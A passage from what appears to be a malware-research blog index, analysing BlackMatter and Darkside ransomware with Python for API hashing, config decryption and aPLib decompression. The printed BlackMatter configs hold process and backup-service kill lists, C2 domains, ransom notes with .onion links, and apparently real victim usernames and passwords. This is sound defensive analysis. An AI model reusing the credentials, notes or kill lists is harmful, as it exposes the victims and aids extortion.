Flags: b&#39;0001010101010101012c000000a9000000ea00000000&#39; b&#39;0 xc1 xbdW x89 x82 xd1f x82 x8d x90- - x88914 xfa xb2 xeba rIH( x8f xe8V!hQ? xf5 x83 xd2&amp;p xe7 x92 xe1 xd2 x95B xda xa0 xe2 xc6 x9bO xd9 x92 xb5p x1a xd9- xf0 x7f xf8 x89 x98 x89 x87v xb1 xe3 x83 x90 xf4Sf xd7 xb12 x0czE)C xac x8a L x15. xe9W&#39; b&#39; xcc xedn{ xe9 xd1{ x8b x80 xaao xd0 xadW xb2c xcd xe2&gt;y xad xd0 xc0 xac( xeb xbd x81 x18 x83 x03 xe3 # xff x04h xe0 xdb x05&#39; b&#34; r x8a xaaV xfc`/ xd2 xc6d x1ao; xe02B x9c x0e xa8j6 xc7 xefX x9dU x97 x8a xd8w xf8 x8e x8a x95S3 xddV x89 x05s xf7 xff x12 xcd xd0 xf8 xa8d xd3 x9eN x0e xbe9 xcdLa]b4pv x92 x85 x83 xac xe1 x1b xa0 xde, x1b x14 xee xba_ xf3 xf4 xff.{ L x99 x83U6 xe5w x9f x10? xc6b xbe] xed&#39;p xc1 xeb xca x04 xcf xc8 xa9 x12a@ x9f x87lm xf1 x0831 xef x08 xde x15 xcd xbd x08N xdb xe1) x91(v4 xe7^$h x84 xe3 xa9 x8c xcco x80 x97 x9c x93 xc6U rSn xcca xce xb5 xae xfa x08 xcb xf8 xab xe9 x88 xc2 x99 xe4 x19 x9eO x94 x97 xea xef x16 x14 x1a xcbf* xb3 xe9o xa2 xd9!_ x9f xd2&amp;((f x84 xd1 x10 xa2&#34; b&#39;encsvc | thebat | mydesktopqos | xfssvccon | firefox | infopath | winword | steam | synctime | notepad | ocomm | onenote | mspub | thunderbird | agntsvc | sql | excel | powerpnt | outlook | wordpad | dbeng50 | isqlplussvc | sqbcoreservice | oracle | ocautoupds | dbsnmp | msaccess | tbirdconfig | ocssd | mydesktopservice | visio | | &#39; b&#39;mepocs | memtas | veeam | svc$ | backup | sql | vss | msexchange | | &#39; b&#39;https://fluentzip.org | http://fluentzip.org | | &#39; b&#39;OFMO220@R5-CORE.R5.AIG.NET:yhU6VJ$&amp;amp | nq7tA9 | OSYST93@R5-CORE.R5.AIG.NET:RPo@ndf9 | OFMO225@R5-CORE.R5.AIG.NET:DH5U87@rA0ELa2 | &#39; b&#34; ~+ r n * + r n &#39; BLACK | r n () .-.,=&#39;``&#39;=. - o - r n &#39;=/_ | r n * | &#39;=._ | r n `=./`, &#39; r n . &#39;=.__.=&#39; `=&#39; * r n + Matter + r n O * &#39; . r n r n&gt;&gt;&gt; What happens? r n Your network is encrypted, and currently not operational. r n We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data. r n r n&gt;&gt;&gt; What data stolen? r n From your network was stolen large amount of data. r n If you do not contact us we will publish all your data in our blog and will send it to the biggest mass media. r n r n&gt;&gt;&gt; What guarantees? r n We are not a politically motivated group and we do not need anything other than your money. r n If you pay, we will provide you the programs for decryption and we will delete your data. r n If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. r n We always keep our promises. r n r n&gt;&gt; How to contact with us? r n 1. Download and install TOR Browser (https://www.torproject.org/). r n 2. Open http://supp24maprinktc7uizgfyqhisx7lkszb6ogh6lwdzpac23w3mh4tvyd.onion/U6H6RKDF6W3B8XOWL r n r n&gt;&gt; Warning! Recovery recommendations. r n We strongly recommend you to do not MODIFY or REPAIR your files, that will damag&#34; .",
            "url": "https://research.openanalysis.net/blackmatter/ransomware/malware/config/2021/10/30/blackmatter_ransomware_v3.html",
            "relUrl": "/blackmatter/ransomware/malware/config/2021/10/30/blackmatter_ransomware_v3.html",
            "date": " • Oct 30, 2021"
        }
        
    
  
    
        ,"post12": {
            "title": "BlackMatter Ransomware",
            "content": "Overview . Sample: 22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6 . References: . Malware Bazaar Sample | ChuongDong Blog | CARBON SPIDER Attribution | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . API Hashing . def ror(value, count=1, base=8): value = (value &gt;&gt; count | value &lt;&lt; (base - count)) &amp; (2**base - 1) return value . out = 0 for i in &#39;ntdll.dll x00&#39;: out = (ord(i) + ror(out, count=13, base=32)) &amp; 0xffffffff print(hex(out)) . 0x411677b7 . Config Decryption . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Extract Config . The Blackmatter config is stored in the PE resource section .rsrc. . The first DWORD of the resource is the seed for an lcg that closely matches the zipcrypto lcg with constant 0x8088405. . The second DWORD is the size of the encrypted config and is followed by the encrypted config data. . import struct import pefile RANSOMWARE_FILE = r&#39;/tmp/blackmatter.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) # Get resource data r_data = None for s in pe.sections: if b&#39;rsrc&#39; in s.Name: r_data = s.get_data() # Parse data from resource seed = struct.unpack(&#39;&lt;I&#39;,r_data[:4])[0] data_size = struct.unpack(&#39;&lt;I&#39;,r_data[4:8])[0] enc_data = r_data[8:] print(&quot;Seed: %s&quot; % hex(seed)) print(&quot;Size: %d&quot; % data_size) . Seed: 0xffcaa1ea Size: 3487 . Decryption Routine . Reference: Tesorion Blackmatter blog . def decrypt(enc_data, data_size, seed): fixed = seed decrypted = bytearray() for i in range(data_size-1): if i &amp; 3 == 0: next_value = struct.unpack(&#39;&lt;I&#39;,enc_data[i:i+4])[0] seed = (0x8088405 * seed + 1) &amp; 0xffffffff rnd = ((seed * fixed) &gt;&gt; 32) &amp; 0xffffffff dw = next_value ^ rnd decrypted.append((dw &gt;&gt; ((i &amp; 3) * 8)) &amp; 0xff) return decrypted . def gen_key_stream(seed, key_length): fixed = seed keystream = b&#39;&#39; for i in range(0,key_length-1,4): seed = (0x8088405 * seed + 1) &amp; 0xffffffff key_dw = ((seed * fixed) &gt;&gt; 32) &amp; 0xffffffff keystream += struct.pack(&#39;&lt;I&#39;,key_dw) return keystream def decrypt(enc_data, data_size, seed): out = [] keystream = gen_key_stream(seed, data_size) for i in range(data_size): out.append(enc_data[i] ^ keystream[i]) return bytes(out) ap_data = decrypt(enc_data, data_size, seed) ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#39; x87 x19 xa80 xf4 xba x94 x94 x92 x91X+fT xf9l x96 xd9 xa0 xf4A x9fR xf3g xcf. x19 xb9 xc9Z x9bp x91 xcb xef xaf xbeZ xe3 x9d xae(X x94Y n x8d xb8 xb7d xe5r xfa xb5#FF xf8e x9a xda/ xbd x8c7 xbf xdd xd6 x07 x97 xa5 xad x9d xad- xed7 x96 x9d x17 x9e xa4 xadL x19 x80 xd0 xe7 x0b x05bA xd3% xe1 x8b xeb xc4 x92_ xa5j xbf x81 x0f x91ny2 xd0 x16 xa8n: xd9wI xe7_ x901 x11K x06 x0bVQ$x xc0 x8d xad xa2 xaf x19 xe4 x98 x08 xfb xda[ x0b xa6 xf30 xb0 x9c xd4{O xb9!Ox6 xaaF xad x00 x01 x01 x01 x01 x01 x01 x01$ x00 x00 x00 xa1 x00 x00 x00 xe2 x00 x00 x00 x00 x00 x00 x00 xf3 x01 x00 x00 xc8 x04 x00 x009 x05 x00 x002 x06 x00 x00 x1f x07 x00 x00ro4BrnX5Zms1fmgmp9Hypi0hCgPduMrclWUIq05OADb1eHAmezreXJI46rfXbELjszc67ztiIrrUJUtMlON1LsA7puHNgfKMOAvLUpTmZlNYac7GNXnwBwAAAAB= x00UqLSghWqzIY3WZfbVqvI/NH3zsibCQc59aY6wgDsa4SWrgzwNariy+RXqoUAAAAA x00k8UWrwAbmN9xl+JkwBxI3YAbWNsAHijNQBgQycAYkOlAGKDHgBywywAdgOfAHIDdgBww48AcGN3AGHjVQBnI2cAYwOHxlLpKMZbiSgAZEOMAHMDxABuA04CrnsnAG2jnABtgy9u3a0rAGyDdwByI4cAYmNUAHQjTQBpwx0AbIMmAG0jFAA6wZ8DYXuFAHZDJABnA1UAemOnAG2jJ/sv8oQAamOkAGTDbepsuzQAcCN03eMpMABxg6QAcYMkAGbDFwBhg1cAcqN0AAAAA x00ZQBuAGMAcwB2AGMAAAB0AGgAZQBiAGEAdAAAAG0AeQBkAGUAcwBrAHQAbwBwAHEAbwBzAAAAeABmAHMAcwB2AGMAYwBvAG4AAABmAGkAcgBlAGYAbwB4AAAAaQBuAGYAbwBwAGEAdABoAAAAdwBpAG4AdwBvAHIAZAAAAHMAdABlAGEAbQAAAHMAeQBuAGMAdABpAG0AZQAAAG4AbwB0AGUAcABhAGQAAABvAGMAbwBtAG0AAABvAG4AZQBuAG8AdABlAAAAbQBzAHAAdQBiAAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAYQBnAG4AdABzAHYAYwAAAHMAcQBsAAAAZQB4AGMAZQBsAAAAcABvAHcAZQByAHAAbgB0AAAAbwB1AHQAbABvAG8AawAAAHcAbwByAGQAcABhAGQAAABkAGIAZQBuAGcANQAwAAAAaQBzAHEAbABwAGwAdQBzAHMAdgBjAAAAcwBxAGIAYwBvAHIAZQBzAGUAcgB2AGkAYwBlAAAAbwByAGEAYwBsAGUAAABvAGMAYQB1AHQAbwB1AHAAZABzAAAAZABiAHMAbgBtAHAAAABtAHMAYQBjAGMAZQBzAHMAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABvAGMAcwBzAGQAAABtAHkAZABlAHMAawB0AG8AcABzAGUAcgB2AGkAYwBlAAAAdgBpAHMAaQBvAAAAAAA= x00bQBlAHAAbwBjAHMAAABtAGUAbQB0AGEAcwAAAHYAZQBlAGEAbQAAAHMAdgBjACQAAABiAGEAYwBrAHUAcAAAAHMAcQBsAAAAdgBzAHMAAAAAAM== x00aAB0AHQAcABzADoALwAvAHAAYQB5AG0AZQBuAHQAaABhAGMAawBzAC4AYwBvAG0AAABoAHQAdABwADoALwAvAHAAYQB5AG0AZQBuAHQAaABhAGMAawBzAC4AYwBvAG0AAABoAHQAdABwAHMAOgAvAC8AbQBvAGoAbwBiAGkAZABlAG4ALgBjAG8AbQAAAGgAdAB0AHAAOgAvAC8AbQBvAGoAbwBiAGkAZABlAG4ALgBjAG8AbQAAAAAA x00C2z82X8UNlVWpRL/7HSBasNxpndpCBUpB+MWdbNV7mcJdoNZrmMK1voS3Lk2O5sO2na/iU5tIQfKQi02QE9Dh9OlvvpEngo9fLXTAq/c2uI6qW3VzkoEAq0UF1RHCtt9IDp/O4g08nCcH8qSysq2lXQsFTHqy6RqIFgl32q4CxkS/UeWzJMJHm8QTBYHyd3md1dNUwakErEVTPab7iiF+3nuRDipYmcyuqrNf1AfOE9= x00Sky0+To0IX4FhV7fqVTTSqNR7lchKFYJV8MYVfB1oUdEVpl5v0MY9uoytJlzG9IDo1bzqQtNcyfqYmkWE28Op5CF6toMvmodP7ixIuz8isI0iS71hmpJIrc0ARhjSeNdbBo+G5oU4gygFdOy6ur3vTkMWBGj5edEZWVxv36fRDdT3RO2jrMUPgIwBDZP6Z7GJ3duWUWEXZFYbOy7pwjR3CHBehjkQn8SsIq7X3A/GG/gYQwGUwfyB6fzn5635c5tPI+3Xa6esX5WyfKStN7cECBmhNShOm3upTtQ3N4lWCEbnkVm4GTCuGJ271M69qDH8bLzQzKwhBUZ4leF32xQxiEgaTagxfBjIasUkkrurJIjsvkaCj1DTPyJBrRi3aLz2t6bKBKvSYJvonY7cCc0ikIvh92MJDEgql4siiYOad+hAzDpX3NFlhpsdCBL6HnYNV5bdqyjUytMBZ+9h17bFoLdJdWPTKHZbGw+rHmY0M/0+h5ERxLkaHpiTjB3FpaWM8FmlcH1RBs79y9pVh3EWkT/JSPa9i3smMnBAWTCjn3XZXX8YvrzCTNQTZZCxan1WOzFXyuUMyoWuyaFLgoQ7EyGUeD/sEwEeDAw3D3MgEYPpo8z6tC9bO1GaOcx9HbOkvuT27D1yq79WrA8YrsEN0S5QAqtxNIpvG8i7Ck8LXH4g9PO6w1CjtEgHAJVvojQoDTLvAFEgIc9MQj7A0T1eApGqwD2cVOkcWXFLHwO1ipabWZEZqw5Okm+a/YdnsADUWIsSLfqVBiqXKDoFDhYNYml+SpevZm16EIVMYCoMpQ/2g7L0Mx0QQk38aewGMOYVP9NwAGGSfWimMQ/62jR0YZr6nVYdFY7EtKFvQx5h1dMCwW3ZfO/R8NzSkJW3Cg8kLgxt4/T3/zAXGOTIlCpGpgGe3xUlB9VMeXXFt2t1ckcChtkKJcLxBreEAoayqg+eMgd3fWR1HYeUT+u7AOlpKUPW83bahOLICCKrJ0MpENc39M16b3LgPEvHHAnJ9q/a4xi+kshwmeQmUzGF0DuExrhNKOZP1M98avZM9aHJAvLatfP7gFEv2EdUaL/3iMxxKHZXvAeds4aaEwgUsX2uoB2nrxFdc68kQcQVL9t1k6/RJgdt0tzdcQz1LuqYCYr7l7OSsM79zeca0qjVSALI5QZJxPbgV5vYkni3PSTtuGSGo/UIgssYU5zsWa1xi3GcoLATKKM42LtWlQQO1UkAqr7LdjRQf50eunTJrippNIIwHeuauir8ZLZXj8jVY717EiNGlgm5Gz3ac7mmKYkNImRXSNMQ5ijvYGuaHVV+BhQy83h2vWGl8OtyXja1tsmroKSxk4ywXStW2mM/GrZFKO6kCcKQQbqBudqP4hCUF7apUoQW/o1oG4DJSFO474h07kidsLDIh8r0Sq9EcqvG36wZFWumpqTP5KWMcRqJQyArhC7HBlxc2lU3te24aF3Z8LzTWTgPdUPvsDXPmQvDJsUZMuaf5CcCNnEFUImcVggDSB7Mv8cBpNHIIjwoY3QTGcggwjon8qDIXSm/VjE5Sx81U+nlFkDNPUEtKqYXQFW2rDXhNXQ5CTAwBvdOWoBZGFivLMCfwaY4o0WUuY6n+dK5yp2w6/AV2m7oPy4PGpgBivZRB/qqtWRRxZD/rnSjx3/Ss6hQNlLUEVC2hCguYbi3nJI0q1hPAUHmUHpJ4HPLN3gW+ngi7ILDf8157T7cQW04koJqVXsej5vQtuEVk9USHz8KUsarnH23ryCzilkyYbqa4yCEGC7fMRndyDWEoIMHyXR1y2+5UoB78xuCEHx2iUEgWSz1mPUtn3KbcU/BrQGwrpNlbIu3f7FrPxZZPcCbrDeMEDECSeYmYT6l/alcA3hLFkvtwoF6Y4Ok8kEdC1YGpXJvsFy2y9fxBGMwYKQhye9NK2cjJxrZmjXSoMxJ+NX7De/U3AzPbo0YfezU4IWTgkDfJmfl0Opyh7KZb+irlBi4p6d366PekDqJO+2ttPXQS03IL4C9RoXRRMHxUex/PHzcAMjWbGfWqRURrZaaaZz66rk61Wz x00&#39; . import base64 ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 8 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c)) . def is_ascii(s): return all(c &lt; 128 for c in s) print(&quot;RSA: %r n&quot; % rsa_data) print(&quot;Affiliate ID: %r n&quot; % affiliate_id_data) print(&quot;Flags: %s n&quot; % tohex(config_flags)) for c in config_values: if not is_ascii(c): c = new_data = decrypt(c,len(c), seed) print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c.split(b&#39; x00 x00&#39;)])) . RSA: b&#39; x87 x19 xa80 xf4 xba x94 x94 x92 x91X+fT xf9l x96 xd9 xa0 xf4A x9fR xf3g xcf. x19 xb9 xc9Z x9bp x91 xcb xef xaf xbeZ xe3 x9d xae(X x94Y n x8d xb8 xb7d xe5r xfa xb5#FF xf8e x9a xda/ xbd x8c7 xbf xdd xd6 x07 x97 xa5 xad x9d xad- xed7 x96 x9d x17 x9e xa4 xadL x19 x80 xd0 xe7 x0b x05bA xd3% xe1 x8b xeb xc4 x92_ xa5j xbf x81 x0f x91ny2 xd0 x16 xa8n: xd9wI xe7_ x901 x11K x06 x0bV&#39; Affiliate ID: b&#39;Q$x xc0 x8d xad xa2 xaf x19 xe4 x98 x08 xfb xda[ x0b xa6 xf30 xb0 x9c xd4{O xb9!Ox6 xaaF xad&#39; Flags: b&#39;000101010101010124000000a1000000e20000000000&#39; b&#39; xc4 xe2 x95wo xed9&gt; x10 xdb x16 xd9. xa5 x01 xcc xaeP xc4t xdc xb0 xbc xf5 xe2 x860 xde x9e x1b x81Q x91 x0e xc9 x7f xe4Y xe6 x8aX*~ x0e x84W xb0 xed x1aA xe9f x10 x0fq xbd x1eg x02z xa7 xac[ xa9z x9el x1b xe1 x1f xb8 xb1, xbepPX: xcc xb1L xc0 xc0 x13 x943 x99 x05 x97 x14CT&#39; b&#39;8 xceF[ x0f xbe x93 xd3 x12 xfc xe9$ xdf xdf; x96R x86 xbf x9a x01q x10 x82E x02 xb7 xd0 xb9 xea xe3 xf2 xd8 xb5 xa9 xaa xc9 xda x1d.E&gt;&lt;S; xf2 x0e&#39; b&#34; xf9 xa9 x82v x1a x0f xc7 x8aT2 x9c x9bIh xbb xb7 x03j x96 xac x01 x16^ xe47 xfb( xbc x10M x11 x8e$n x19 x9e x1f x7f x88 x1d xca x0f x14^ x93&#39;r xd3)j xe3j xebqK xda nZ1 xe3sV xe6^z xbd n x1b xdd n xf0w%#YH xcc xc5 xba x01 x14 xb5 xce$ xa1Q xe9 xd1 x17 xbf xdd x9d xe2 x11 xc0 x9aL!~ xf0a x83 xa9:m x04 xd3O n xd6_t xd04 xe0 xe4 x83 xd6 xc2 xb9 tB&amp; x18^ xa3Y xd0 xf3 xe6{S xa3 x9d xcby xef xc8z xf7/ xd4./ x07N xa3 x86% xba xe5X xb8W xa4Ry xe3 rZ x1c xf4 xbd xd1 xc4{o xe9 xea1 xc9 xb2P x030 x92 xab9 xe6js; xb2 xce x87 xcf xdfw xba xf6^ x88 xdc xb7 xf7 xa8N xa23 x83v xe9 x8e xb2&#34; b&#39;encsvc | thebat | mydesktopqos | xfssvccon | firefox | infopath | winword | steam | synctime | notepad | ocomm | onenote | mspub | thunderbird | agntsvc | sql | excel | powerpnt | outlook | wordpad | dbeng50 | isqlplussvc | sqbcoreservice | oracle | ocautoupds | dbsnmp | msaccess | tbirdconfig | ocssd | mydesktopservice | visio | | &#39; b&#39;mepocs | memtas | veeam | svc$ | backup | sql | vss | | &#39; b&#39;https://paymenthacks.com | http://paymenthacks.com | https://mojobiden.com | http://mojobiden.com | | &#39; b&#39;aheisler@hhcp.com:120Heisler | dsmith@hhcp.com:Tesla2019 | administrator@hhcp.com:iteam8** | | &#39; b&#34; ~+ r n * + r n &#39; BLACK | r n () .-.,=&#39;``&#39;=. - o - r n &#39;=/_ | r n * | &#39;=._ | r n `=./`, &#39; r n . &#39;=.__.=&#39; `=&#39; * r n + Matter + r n O * &#39; . r n r n&gt;&gt;&gt; What happens? r n Your network is encrypted, and currently not operational. We have downloaded 1TB from your fileserver. r n We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data. r n r n&gt;&gt;&gt; What guarantees? r n We are not a politically motivated group and we do not need anything other than your money. r n If you pay, we will provide you the programs for decryption and we will delete your data. r n If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. r n We always keep our promises. r n r n&gt;&gt; Data leak includes r n1. Full emloyeers personal data r n2. Network information r n3. Schemes of buildings, active project information, architect details and contracts, r n4. Finance info r n r n r n&gt;&gt;&gt; How to contact with us? r n 1. Download and install TOR Browser (https://www.torproject.org/). r n 2. Open http://supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion/7NT6LXKC1XQHW5039BLOV. r n r n&gt;&gt;&gt; Warning! Recovery recommendations. r n We strongly recommend you to do not MODIFY or REPAIR your files, that will damage them.&#34; b&#39;&#39; .",
            "url": "https://research.openanalysis.net/blackmatter/ransomware/malware/config/2021/10/28/blackmatter_ransomware.html",
            "relUrl": "/blackmatter/ransomware/malware/config/2021/10/28/blackmatter_ransomware.html",
            "date": " • Oct 28, 2021"
        }
        
    
  
    
        ,"post13": {
            "title": "Darkside Ransomware",
            "content": "Overview . Sample: 0A0C225F0E5EE941A79F2B7701F1285E4975A2859EB4D025D96D9E366E81ABB9 . References: . Malshare Sample | ChuongDong Blog | Cybergeeks Blog | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . API Hashing . A simple API hashing algorithm is used to resolve LoadLibraryA and GetProcAddress. . The rest of the dynamically resolved APIs are resolved via GetProcAddress once their function names have been decrypted. . kernel32_hash = 999818334 string = b&#39;k x00e x00r x00n x00e x00l x003 x002 x00. x00d x00l x00l x00&#39; hash_high = 0xffff hash_low = 0xffff for ptr in range(len(string)): hash_low = (hash_low + string[ptr]) hash_high = (hash_high + hash_low) hash_high %= 0xFFF1 hash_low %= 0xFFF1 hash = (hash_high &lt;&lt; 16) + hash_low print(hex(hash)) print(&#39;===&#39;) print(hex(kernel32_hash)) . 0x3b98045e === 0x3b98045e . API String Decryption . A unique decryption method is used to both decrypt the API strings as well as other data stored in the ransomware binary. The decryption is split into two main functions, one used to generate a decryption key buffer, and another used to perform the actual decryption. . import struct def gen_key_buffer(buf1, buf2): key_buffer = [0]*256 v3 = 240 v4 = buf1[:4] v5 = buf1[4:8] v6 = buf1[8:12] result = buf1[12:] v3 = 240 while v3 &gt;= 0: for i in range(4): key_buffer[v3 + i + 12 ] = v4[i] key_buffer[v3 + i + 8 ] = result[i] key_buffer[v3 + i + 4 ] = v5[i] key_buffer[v3 + i] = v6[i] v4 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v4)[0] - 0x10101010) &amp; 0xffffffff); result = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,result)[0] - 0x10101010) &amp; 0xffffffff); v5 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v5)[0] - 0x10101010) &amp; 0xffffffff); v6 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v6)[0] - 0x10101010) &amp; 0xffffffff); v3 -= 16 lo_v8 = 0 v9 = 0 v10 = 0 flag_return = False while True: if flag_return: break while True: lo_result = key_buffer[v9] &amp; 0xff lo_v8 = (lo_result + ((buf2[v10] + lo_v8) &amp; 0xff)) &amp; 0xff hi_result = key_buffer[lo_v8] v10 += 1 key_buffer[lo_v8] = lo_result key_buffer[v9] = hi_result if v10 &gt;= 16: break v9 += 1 v9 &amp;= 0xff if v9 == 0: flag_return = True break v10 = 0 v9 += 1 v9 &amp;= 0xff if v9 == 0: break return key_buffer def decrypt_data(data, key_buffer): data = list(data) data_len = len(data) key = key_buffer.copy() edx = 0 cl = 0 curr_index = 0 eax = 0 while data_len != 0: cl = (key[(1 + edx) &amp; 0xff] + cl) &amp; 0xFF eax = key[(1 + edx) &amp; 0xff] &amp; 0xFF ch = key[cl] &amp; 0xFF key[cl] = eax key[(1 + edx) &amp; 0xff] = ch eax = (ch + eax) &amp; 0xFF edx = (edx + 1) &amp; 0xff data[curr_index] ^= key[eax] curr_index += 1 data_len -= 1 return bytes(data) . Setup Decryption Key Buffer . KEY_BUFFER can be used in the decryption algorithms as a global . KEY_BUFFER = gen_key_buffer(unhex(&#39;edf9e5ed8640fd53ab185838646bd9df&#39;),unhex(&#39;92b2801a9c19867db6a5002936c1084a&#39;)) decrypt_data(unhex(&#39;7b0d2ddb284b&#39;),KEY_BUFFER) . b&#39;ntdll x00&#39; . Config Decryption Functions . Because the config file is so large it needs it&#39;s own custom decryption wrapper to decrypt 256 bytes at a time. The decryption routine also needs to handle 256 blocks of data. The config is also compressed using aplib and the values are base64 encoded. . The following functions will aid in the config decryption. . Large Data Decrypt . def decrypt_large_data(data, key_buffer): out = b&#39;&#39; for ptr in range(0,len(data),255): out += decrypt_data(data[ptr:ptr+255],key_buffer) return out . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Config 